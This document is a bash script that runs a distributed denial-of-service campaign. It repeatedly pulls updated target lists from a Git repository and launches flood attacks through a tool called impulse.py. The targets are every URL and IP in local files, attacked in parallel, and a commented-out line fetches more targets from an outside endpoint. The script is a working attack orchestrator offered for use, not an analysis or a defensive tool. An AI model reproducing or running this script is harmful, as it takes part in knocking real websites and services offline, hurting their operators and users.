# Create variables from named arguments.
while [ $# -gt 0 ]; do
  if [[ $1 == *"--"* ]]; then
      v="${1/--/}"
      declare $v="$2"
  fi
  shift
done

# Set default values for arguments if missing.
method="${method:-HTTP}"
time="${time:-50}"
threads="${threads:-20}"

attack="python3 impulse.py --method ${method} --time ${time} --threads ${threads} --target %"

while true
do
  # jitter to avoid concurency updates from Git
  sleep $[ ( $RANDOM % 10 )  + 1 ]s
  
  echo "Get the latest scripts & URLs..."
  git pull --rebase origin master
  
  echo "Start attacking..."
  if [ "$method" == "HTTP" ]; then
    cat urls | xargs -n1 -I % bash -c "${attack}"
  else
    # Execute two different attacks in parallel. One takes the source of IPs
    # from http://whats-alive.com/alive and another one uses the local `urls`
    # file to resolve IPs.

    # TODO: Uncomment and remove the `ips` file when the endpoint works again.
    # curl --max-time 60 http://whats-alive.com/alive | xargs -n1 -I % bash -c "${attack}" &
    cat ips | xargs -n1 -I % bash -c "${attack}" &
    cat urls | xargs -n1 -I % bash -c 'node ip-lookup.mjs %' | xargs -n1 -I % bash -c "${attack}" & 
    wait
  fi
done
